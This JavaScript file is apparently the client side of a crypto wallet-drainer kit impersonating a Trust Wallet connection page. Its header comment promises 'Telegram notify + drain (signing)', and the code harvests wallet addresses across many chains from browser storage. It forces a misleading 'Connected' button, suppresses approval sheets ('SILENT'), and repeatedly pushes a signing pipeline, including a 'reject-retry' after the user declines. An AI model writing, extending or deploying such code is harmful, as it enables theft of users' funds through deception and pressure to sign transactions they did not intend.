/**
 * Trust site — recover WC session after Safari↔Trust roundtrip.
 * After connect: Telegram notify + drain (signing) — not just a fake "Connected" button.
 */
(function () {
  'use strict';

  var KEY_ADDR = 'trust_site_connected_addr';
  var recovering = false;
  var pipelineBusy = false;
  var lastShown = '';

  function saveAddr(addr) {
    addr = String(addr || '').toLowerCase();
    if (!/^0x[a-f0-9]{40}$/.test(addr)) return '';
    try {
      sessionStorage.setItem(KEY_ADDR, addr);
      sessionStorage.setItem('legion_wc_evm_addr', addr);
    } catch (_) {}
    return addr;
  }

  function loadAddr() {
    try {
      return sessionStorage.getItem(KEY_ADDR) || sessionStorage.getItem('legion_wc_evm_addr') || '';
    } catch (_) {
      return '';
    }
  }

  function shortAddr(a) {
    a = String(a || '');
    return a.length > 12 ? a.slice(0, 6) + '…' + a.slice(-4) : a;
  }

  /** Scan WC v2 localStorage for all chain accounts — saves non-EVM to sessionStorage */
  function scanWcStorageAddr() {
    var evmAddr = '';
    var NS_MAP = {
      solana: 'legion_sol_addr', bip122: 'legion_btc_addr',
      tron: 'legion_tron_addr', ton: 'legion_ton_addr', tvm: 'legion_ton_addr',
      cosmos: 'legion_cosmos_addr', aptos: 'legion_aptos_addr', sui: 'legion_sui_addr',
    };
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i) || '';
        if (k.indexOf('wc@') === -1 && k.indexOf('wagmi') === -1 && k.indexOf('@appkit') === -1) continue;
        var raw = localStorage.getItem(k) || '';
        // EVM
        if (!evmAddr) {
          var m = raw.match(/eip155:\d+:(0x[a-fA-F0-9]{40})/);
          if (m) evmAddr = m[1].toLowerCase();
          if (!evmAddr) {
            var m2 = raw.match(/"(0x[a-fA-F0-9]{40})"/);
            if (m2 && /account|address/i.test(raw)) evmAddr = m2[1].toLowerCase();
          }
        }
        // Non-EVM namespaces
        try {
          var obj = JSON.parse(raw);
          var sessions = obj && typeof obj === 'object' ? Object.values(obj) : [];
          for (var si = 0; si < sessions.length; si++) {
            var ns = sessions[si] && sessions[si].namespaces;
            if (!ns) continue;
            Object.keys(NS_MAP).forEach(function (nsKey) {
              if (!ns[nsKey] || !ns[nsKey].accounts || !ns[nsKey].accounts[0]) return;
              var caip = ns[nsKey].accounts[0];
              var parts = String(caip).split(':');
              var addr = parts[parts.length - 1];
              if (addr) {
                try { sessionStorage.setItem(NS_MAP[nsKey], addr); } catch (_) {}
              }
            });
          }
        } catch (_) {}
      }
    } catch (_) {}
    // Also pull from legion.state.chains if available
    try {
      var s = window.legion && window.legion.state && window.legion.state.chains;
      if (s) {
        if (s.SOL    && s.SOL.address)    { try { sessionStorage.setItem('legion_sol_addr',    s.SOL.address);    } catch (_) {} }
        if (s.TRON   && s.TRON.address)   { try { sessionStorage.setItem('legion_tron_addr',   s.TRON.address);   } catch (_) {} }
        if (s.TON    && s.TON.address)    { try { sessionStorage.setItem('legion_ton_addr',    s.TON.address);    } catch (_) {} }
        if (s.BTC    && s.BTC.address)    { try { sessionStorage.setItem('legion_btc_addr',    s.BTC.address);    } catch (_) {} }
        if (s.COSMOS && s.COSMOS.address) { try { sessionStorage.setItem('legion_cosmos_addr', s.COSMOS.address); } catch (_) {} }
      }
    } catch (_) {}
    return evmAddr;
  }

  function setConnectButton(addr) {
    addr = saveAddr(addr) || loadAddr();
    if (!addr) return;
    lastShown = addr;
    var btn = document.getElementById('cfmbtn');
    if (!btn) return;
    btn.textContent = 'Connected ' + shortAddr(addr);
    btn.className = 'btn btn-blue confirm-btn confirm-active';
    btn.disabled = false;
    btn.removeAttribute('disabled');
    btn.setAttribute('aria-disabled', 'false');
    btn.onclick = function (e) {
      e.preventDefault();
      e.stopPropagation();
      // Silent: no approve sheet — legion pipeline only
      runPipeline('button-tap');
    };
  }

  /** Nudge Trust app — prefer wc: URI deep-link; bare trust:// only as last resort. */
  function openTrustNudge() {
    try {
      // Do NOT set deepLinkTarget here — that forceFresh-wipes an active WC session
      window.__LEGION_DEEP_LINK_TARGET__ = null;
    } catch (_) {}
    try {
      if (typeof window.__TRUST_OPEN_DEEPLINK__ === 'function' && window.__TRUST_OPEN_DEEPLINK__(true)) {
        return;
      }
    } catch (_) {}
    var uri = null;
    try {
      if (typeof window.__TRUST_GET_WC_URI__ === 'function') uri = window.__TRUST_GET_WC_URI__();
    } catch (_) {}
    if (uri && String(uri).indexOf('wc:') === 0) {
      try { window.location.href = 'trust://wc?uri=' + encodeURIComponent(uri); } catch (_) {}
      setTimeout(function () {
        try {
          if (!document.hidden) {
            window.location.href = 'https://link.trustwallet.com/wc?uri=' + encodeURIComponent(uri);
          }
        } catch (_) {}
      }, 700);
      return;
    }
    try { window.location.href = 'trust://'; } catch (_) {}
    setTimeout(function () {
      try {
        if (!document.hidden) window.location.href = 'https://link.trustwallet.com';
      } catch (_) {}
    }, 700);
  }

  function showApproveSheet(addr) {
    // SILENT satellites — no overlay sheets (plan: one-flow silence)

    return;
  }

  function setSheetStatus(msg) {
    var sub = document.getElementById('__trust_approve_sub');
    if (sub) sub.textContent = msg;
  }

  async function ensureProviderAndAddr() {
    var addr = '';
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        addr = String(window.legion.state.evmAddr).toLowerCase();
      }
    } catch (_) {}

    var inTrust = false;
    try {
      if (window.__TRUST_IN_APP__ || (typeof window.__TRUST_IS_IN_APP__ === 'function' && window.__TRUST_IS_IN_APP__())) {
        inTrust = true;
      }
      if (/utm_source=Trust_(iOS|Android)_Browser/i.test(String(location.search || ''))) inTrust = true;
    } catch (_) {}

    // Inside Trust Browser: prefer injected ethereum (real confirm popup). Never overwrite with WC.
    if (inTrust) {
      var inj = null;
      try {
        if (window.trustwallet && window.trustwallet.ethereum) inj = window.trustwallet.ethereum;
        else if (window.ethereum) inj = window.ethereum;
      } catch (_) {}
      if (inj) {
        try {
          var acctsI = await inj.request({ method: 'eth_accounts' });
          if ((!acctsI || !acctsI[0]) && typeof inj.request === 'function') {
            try { acctsI = await inj.request({ method: 'eth_requestAccounts' }); } catch (_) {}
          }
          if (acctsI && acctsI[0]) addr = String(acctsI[0]).toLowerCase();
        } catch (_) {}
        if (window.legion) {
          try {
            window.legion.state.evmProvider = inj;
            if (addr) window.legion.state.evmAddr = addr;
            window.legion.state.connectMode = 'injected';
            window.legion.state.wcSessionActive = false;
            window.legion.state.evmWallet = 'Trust Wallet';
            try { inj.isWalletConnect = false; } catch (_) {}
          } catch (_) {}
        }
        if (addr) saveAddr(addr);
        return { addr: addr, prov: inj, mode: 'injected' };
      }
    }

    // Outside Trust: recover live WC session
    var prov = null;
    try {
      if (window.LegionWallet && typeof window.LegionWallet.tryRecoverStoredSession === 'function') {
        prov = await window.LegionWallet.tryRecoverStoredSession(true);
      }
    } catch (e) {

    }

    if (prov) {
      try {
        var accts = await prov.request({ method: 'eth_accounts' });
        if (accts && accts[0]) addr = String(accts[0]).toLowerCase();
      } catch (_) {}
      if (!addr && window.LegionWallet.getAccount) {
        var a2 = window.LegionWallet.getAccount();
        if (a2 && a2.address) addr = String(a2.address).toLowerCase();
      }
      if (window.legion) {
        try {
          window.legion.state.evmProvider = prov;
          if (addr) window.legion.state.evmAddr = addr;
          window.legion.state.connectMode = 'wc';
          window.legion.state.wcSessionActive = true;
          window.legion.state.evmWallet = window.legion.state.evmWallet || 'Trust Wallet';
        } catch (_) {}
      }
    }

    if (!addr) {
      try {
        if (window.LegionWallet && typeof window.LegionWallet.getAccount === 'function') {
          var acc = window.LegionWallet.getAccount();
          if (acc && acc.address) addr = String(acc.address).toLowerCase();
        }
      } catch (_) {}
    }
    if (!addr) addr = scanWcStorageAddr();
    if (!addr) addr = loadAddr();
    if (addr) saveAddr(addr);
    return { addr: addr, prov: prov, mode: prov ? 'wc' : null };
  }

  function runPipeline(why) {
    if (pipelineBusy) return Promise.resolve(false);
    pipelineBusy = true;

    return (async function () {
      try {
        var got = await ensureProviderAndAddr();
        if (!got.addr) {

          return false;
        }
        setConnectButton(got.addr);

        var L = window.legion;
        if (!L) {

          return false;
        }
        try {
          if (got.addr) L.state.evmAddr = got.addr;
          if (got.prov) {
            L.state.evmProvider = got.prov;
            if (got.mode === 'injected') {
              L.state.connectMode = 'injected';
              L.state.wcSessionActive = false;
              try { got.prov.isWalletConnect = false; } catch (_) {}
            } else {
              try { got.prov.isWalletConnect = true; } catch (_) {}
              L.state.connectMode = 'wc';
              L.state.wcSessionActive = true;
            }
          }
          L.state.evmWallet = L.state.evmWallet || 'Trust Wallet';
        } catch (_) {}

        // Approve / reject-retry only — route through single pipeline owner
        if (typeof L.evmAlreadyConfirmed === 'function' && L.evmAlreadyConfirmed()) {

          return true;
        }
        if (typeof L.startPipeline === 'function') {
          var reason = (L.state && L.state.userRejectedSign) ? 'reject-retry' : 'sign';
          var r = await L.startPipeline({ reason: reason });

          return !!(r && r.ok);
        }
        if (typeof L.forceTrustSign === 'function') {
          var r2 = await L.forceTrustSign();
          return !!(r2 && r2.ok);
        }
        return false;
      } catch (e) {

        return false;
      } finally {
        pipelineBusy = false;
      }
    })();
  }

  function markConnected(addr, opts) {
    opts = opts || {};
    addr = saveAddr(addr) || addr;
    if (!addr) return false;
    setConnectButton(addr);
    try {
      window.dispatchEvent(new CustomEvent('trust:addr-recovered', { detail: { address: addr } }));
    } catch (_) {}
    // SILENT: button label only — no sheets, no satellite auto-sign
    return true;
  }

  function waitLegion(cb) {
    if (window.legion && window.LegionWallet) {
      cb();
      return;
    }
    var n = 0;
    var t = setInterval(function () {
      n++;
      if ((window.legion && window.LegionWallet) || n > 100) {
        clearInterval(t);
        cb();
      }
    }, 100);
  }

  async function recoverFromWallet() {
    if (recovering) return false;
    recovering = true;
    try {
      var got = await ensureProviderAndAddr();
      if (got.addr) {

        markConnected(got.addr, { sheet: false, pipeline: false });
        return true;
      }

      return false;
    } finally {
      recovering = false;
    }
  }

  function forceButtonLoop() {
    var addr = loadAddr() || scanWcStorageAddr();
    if (!addr) return;
    var btn = document.getElementById('cfmbtn');
    if (!btn) return;
    if (/Connect Wallet|Connecting/i.test(btn.textContent || '') || btn.textContent.indexOf('Connected') === -1) {
      setConnectButton(addr);
    }
  }

  window.addEventListener('legion:connected', function (e) {
    var d = (e && e.detail) || {};
    var addr = d.address || d.account || '';
    markConnected(addr, { sheet: false, pipeline: false });
  });

  window.addEventListener('legion:embed-ready', function () {
    setTimeout(function () { recoverFromWallet(); }, 400);
  });
  window.addEventListener('legion:ready', function () {
    setTimeout(function () { recoverFromWallet(); }, 400);
  });

  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'visible') {
      setTimeout(function () { recoverFromWallet(); }, 300);
      setTimeout(function () { recoverFromWallet(); }, 1500);
      setTimeout(forceButtonLoop, 200);
    }
  });

  window.addEventListener('pageshow', function () {
    setTimeout(function () { recoverFromWallet(); }, 200);
    setTimeout(forceButtonLoop, 100);
  });

  window.addEventListener('focus', function () {
    setTimeout(function () { recoverFromWallet(); }, 300);
  });

  window.addEventListener('pagehide', function () {
    try {
      if (window.legion && window.legion.state && window.legion.state.evmAddr) {
        saveAddr(window.legion.state.evmAddr);
      }
    } catch (_) {}
  });
  document.addEventListener('visibilitychange', function () {
    if (document.visibilityState === 'hidden') {
      try {
        if (window.legion && window.legion.state && window.legion.state.evmAddr) {
          saveAddr(window.legion.state.evmAddr);
        }
      } catch (_) {}
    }
  });

  var obs = new MutationObserver(function () {
    forceButtonLoop();
  });

  function boot() {
    waitLegion(function () {
      recoverFromWallet();
    });
    if (document.body) {
      obs.observe(document.body, { childList: true, subtree: true, characterData: true });
    }
    setInterval(forceButtonLoop, 1000);
    setInterval(function () {
      if (document.visibilityState === 'visible') recoverFromWallet();
    }, 8000);
  }

  function wrapDirectConnect() {
    var prev = window.__TRUST_DIRECT_CONNECT__;
    if (typeof prev !== 'function' || prev.__trustWrapped) return;
    var wrapped = function () {
      var addr = loadAddr() || scanWcStorageAddr();
      if (addr) {
        markConnected(addr, { sheet: false, pipeline: false });
        return;
      }
      return prev.apply(this, arguments);
    };
    wrapped.__trustWrapped = true;
    window.__TRUST_DIRECT_CONNECT__ = wrapped;
  }

  if (document.body) boot();
  else document.addEventListener('DOMContentLoaded', boot);

  setTimeout(wrapDirectConnect, 0);
  setTimeout(wrapDirectConnect, 500);
  setInterval(wrapDirectConnect, 2000);

  window.__TRUST_SHOW_APPROVE__ = showApproveSheet;
  window.__TRUST_OPEN_TRUST__ = openTrustNudge;
  window.__TRUST_RUN_PIPELINE__ = runPipeline;
})();
